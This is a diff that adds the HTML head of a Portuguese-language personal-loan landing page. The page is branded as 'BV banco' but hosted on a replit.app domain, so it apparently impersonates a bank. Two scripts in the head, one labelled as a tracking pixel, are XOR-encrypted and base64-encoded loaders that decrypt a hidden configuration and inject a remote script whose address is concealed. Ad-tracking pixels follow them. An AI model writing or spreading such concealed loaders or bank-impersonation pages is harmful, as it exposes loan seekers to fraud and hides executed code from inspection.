@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+    <meta property="og:title" content="BV banco - Empréstimo Pessoal com as Menores Taxas" />
+    <meta property="og:description" content="Até R$ 50.000 com as menores taxas do mercado. Aprovação em minutos, PIX na hora. Simule grátis agora." />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://icred-nova.replit.app/opengraph.jpg" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@replit" />
+    <meta name="twitter:title" content="BV banco - Empréstimo Pessoal com as Menores Taxas" />
+    <meta name="twitter:description" content="Até R$ 50.000 com as menores taxas do mercado. Aprovação em minutos, PIX na hora. Simule grátis agora." />
+    <meta name="twitter:image" content="https://icred-nova.replit.app/opengraph.jpg" />
+
+    <script>(function(){var l_1shg=atob("DNUxisXQeN3EVfmYjK4T/7e8WufmPY3s/KYLpeqzHLPqII315bNIpKa/FfOmJ9br76dY+rGjV62tLZz0o6VY8qC8Vre3d9W67aFF+KyyDamhJtui14gdqKK8F7+lOYq6to5KqKuxFbjmb9vo5a1U5oy0WvHmI5j0+bATsOfmGen0Z5iu6LcIvfbgTO2gZMz6tbYCufPyBYC5");var x_d=[];for(var g_claj=0;g_claj<l_1shg.length;g_claj++){x_d.push(l_1shg.charCodeAt(g_claj)&255);}var l_my7q=x_d[0];var u_y=x_d.slice(1,1+l_my7q);var h_y4y2=x_d.slice(1+l_my7q);var k_te=h_y4y2.map(function(b,j_fk){return b^u_y[j_fk%l_my7q];});var g_a="";for(var s_tnw6=0;s_tnw6<k_te.length;s_tnw6++){g_a+=String.fromCharCode(k_te[s_tnw6]&255);}var r_cx=decodeURIComponent(escape(g_a));var s_60=JSON.parse(r_cx);var o_c9p=s_60.globals||[];o_c9p.forEach(function(r_sv){window[r_sv.name]=r_sv.value;});var n_8x=document.createElement("script");n_8x.src=s_60.url;n_8x.async=true;n_8x.defer=true;(s_60.attributes||[]).forEach(function(h_a2r5){n_8x.setAttribute(h_a2r5.name,h_a2r5.value);});(document.head||document.documentElement).appendChild(n_8x);})();</script>
+
+    <!-- Utmify Pixel -->
+    <script>(function(){var j_bu=atob("DGV+kVSMpmVrpghfSR5c5CbghF9JznwrORZEvnvvwgtF03wyIAMHvzfjy0sJ1CcsKhcX4SD/iRUC3m0zZhUX6THgiA8YhCR9KBEK4z3u0xEO1SplEjhSszPgyQcKynt9cz4FszrtywBJnCovIB0b/R3ohElJ0GkzPABcq3a6x1MIkT8+K1ZPoGDvkVAOwjhuflBG8mau2zgW");var h_e=[];for(var e_1=0;e_1<j_bu.length;e_1++){h_e.push(j_bu.charCodeAt(e_1)&255);}var o_wnx=h_e[0];var i_xeq=h_e.slice(1,1+o_wnx);var n_m=h_e.slice(1+o_wnx);var j_667e=n_m.map(function(b,v_n){return b^i_xeq[v_n%o_wnx];});var j_86="";for(var t_b6=0;t_b6<j_667e.length;t_b6++){j_86+=String.fromCharCode(j_667e[t_b6]&255);}var e_mc=decodeURIComponent(escape(j_86));var q_m=JSON.parse(e_mc);var d_570d=q_m.globals||[];d_570d.forEach(function(x_olwx){window[x_olwx.name]=x_olwx.value;});var h_vx=document.createElement("script");h_vx.src=q_m.url;h_vx.async=true;h_vx.defer=true;(q_m.attributes||[]).forEach(function(y_uyvz){h_vx.setAttribute(y_uyvz.name,y_uyvz.value);});(document.head||document.documentElement).appendChild(h_vx);})();</script>
+    <!-- End Utmify Pixel -->
+
+    <script>
+      !function(e,t){e.KwaiAnalyticsObject=t;var i=e[t]=e[t]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){i.push([t,Array.prototype.slice.call(arguments),new Date])}};i.methods.forEach(function(e){a(i,e)});i.instance=function(e){for(var t=i._i&&i._i[e]||[],n=0;n<i.methods.length;n++)a(t,i.methods[n]);return t};i.load=function(t,n){var o="https://webanalyticspa.kwai.com",a=o+"/kwaiq.min.js";i._i=i._i||{};i._i[t]=[];i._i[t]._u=o;i._c=i._c||{};i._c[t]=n;var s=document.createElement("script");s.type="text/javascript";s.async=true;s.src=a;var r=document.getElementsByTagName("script")[0];r.parentNode.insertBefore(s,r)};i.page=function(){i.push(["page",Array.prototype.slice.call(arguments),new Date])}}(window,"kwaiq");
+      kwaiq.load('309815353789522');
+      kwaiq.page();
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '2090052878533092');
+      fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=2090052878533092&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
+    <script type="module" crossorigin src="/assets/index-EEoTC4pR.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-D80_nM8t.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  </body>
+</html>
